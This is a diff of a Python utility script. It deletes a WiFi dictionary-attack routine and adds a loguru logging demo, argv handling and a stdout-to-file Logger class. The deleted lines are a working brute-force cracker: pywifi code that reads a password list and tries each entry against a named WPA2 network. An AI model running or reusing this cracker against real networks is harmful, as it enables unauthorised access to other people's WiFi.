@@ -1,101 +1,113 @@
 import os
 import argparse
 import json
+import sys
+from pathlib import Path
 import os
 from tqdm import tqdm
+from loguru import logger
 
-# parse = argparse.ArgumentParser(description="命令行传入一个数字")
-#
-# parse.add_argument("integers", type=int, nargs="+", help="input an integer")
-# args = parse.parse_args()
-#
-# # 获得传入的参数
-# print(args)
-#
-# # 获得integers参数
-# print(args.integers)
+sink = sys.stdout
+
+logger.add(
+    sink='./service.log',
+    rotation='500 MB',                  # 日志文件最大限制500mb
+    retention='30 days',                # 最长保留30天
+    format="{time}|{level}|{message}",  # 日志显示格式
+    compression="zip",                  # 压缩形式保存
+    encoding='utf-8',                   # 编码
+    level='DEBUG',                      # 日志级别
+    enqueue=True,                       # 默认是线程安全的，enqueue=True使得多进程安全
+)
+
+logger.debug("详细调试信息")
+logger.info("普通信息")
+logger.success("成功信息")
+logger.warning("警告信息")
+logger.error("错误信息")
+logger.trace("异常信息")
+logger.critical("严重错误信息")
 
 
-import pywifi
-from pywifi import const
-import time
+@logger.catch
+def my_function(x, y, z):
+    # An error? It's caught anyway!
+    return 1 / (x + y + z)
 
-#测试连接，返回链接结果
-def wifiConnect(pwd, wifi_name, ifaces):
-    #断开所有连接
-    ifaces.disconnect()
-    # time.sleep(1)
-    wifistatus=ifaces.status()
-    if wifistatus ==const.IFACE_DISCONNECTED:
-        #创建WiFi连接文件
-        profile=pywifi.Profile()
-        #要连接WiFi的名称
-        profile.ssid=wifi_name    
-        #网卡的开放状态
-        profile.auth=const.AUTH_ALG_OPEN
-        #wifi加密算法,一般wifi加密算法为wps
-        profile.akm.append(const.AKM_TYPE_WPA2PSK)
-        #加密单元
-        profile.cipher=const.CIPHER_TYPE_CCMP
-        #调用密码
-        profile.key=pwd
-        #删除所有连接过的wifi文件
-        ifaces.remove_all_network_profiles()
-        #设定新的连接文件
-        tep_profile=ifaces.add_network_profile(profile)
-        ifaces.connect(tep_profile)
-        #wifi连接时间
-        time.sleep(2)
-        if ifaces.status()==const.IFACE_CONNECTED:
-            return True
-        else:
-            return False
-    else:
-        print("已有wifi连接") 
 
-#读取密码本
-def readPassword():
-    #抓取网卡接口
-    wifi=pywifi.PyWiFi()
-    #获取第一个无线网卡
-    ifaces=wifi.interfaces()[0]
+my_function(0, 0, 0)
 
-    print("开始破解:")
-    #密码本路径
-    path="./password.txt"
-    file=open(path,"r")
-    c = 0
-    while True:
-        try:
-            #一行一行读取
-            pad=file.readline()
-            if len(pad) < 8:
-                continue
-            bool=wifiConnect(pad, 'CMCC-PnEE', ifaces)
-            c += 1
-            
-            if bool:
-                print("密码已破解： ",pad)
-                print("WiFi已自动连接!!!")
-                break
-            else:
-                #跳出当前循环，进行下一次循环
-                print(c, "密码破解中....密码校对: ",pad)
-        except:
-            continue
+
+def main():
+    print("sys.argv[0] = ", sys.argv[0])
+    print("__file__ = ", __file__)
+
+    arr1 = sys.argv[1]
+    arr2 = sys.argv[2]
+    print(arr1)
+    print(arr2)
+
+
+class DataSet(object):
+    @property
+    def method_with_property(self):
+        return 15
+
+    def method_without_property(self):
+        return 15
 
 
 def test():
-    wifi=pywifi.PyWiFi()
-    #获取无线网卡
-    ifaces=wifi.interfaces()[0]
-    print(ifaces)
+    d = DataSet()
+    print(d.method_with_property)
+    print(d.method_without_property())
+
+
+def mkdir_if_missing(file_path):
+    p = Path(file_path)
+    if not p.exists():
+        p.mkdir(parents=True)
+
+
+class Logger(object):
+    """
+    Write console output to external text file.
+    Code imported from https://github.com/Cysu/open-reid/blob/master/reid/utils/logging.py.
+    """
+    def __init__(self, fpath=None):
+        self.console = sys.stdout
+        self.file = None
+        if fpath is not None:
+            mkdir_if_missing(os.path.dirname(fpath))
+            self.file = open(fpath, 'a', encoding='utf-8')
+
+    def __del__(self):
+        self.close()
+
+    def __enter__(self):
+        pass
+
+    def __exit__(self, *args):
+        self.close()
+
+    def write(self, msg):
+        self.console.write(msg)
+        if self.file is not None:
+            self.file.write(msg)
+
+    def flush(self):
+        self.console.flush()
+        if self.file is not None:
+            self.file.flush()
+            os.fsync(self.file.fileno())
+
+    def close(self):
+        self.console.close()
+        if self.file is not None:
+            self.file.close()
 
 
 if __name__ == "__main__":
+    # main()
     test()
-
-    # res = wifiConnect(pwd='95279527')
-
-    readPassword()
 
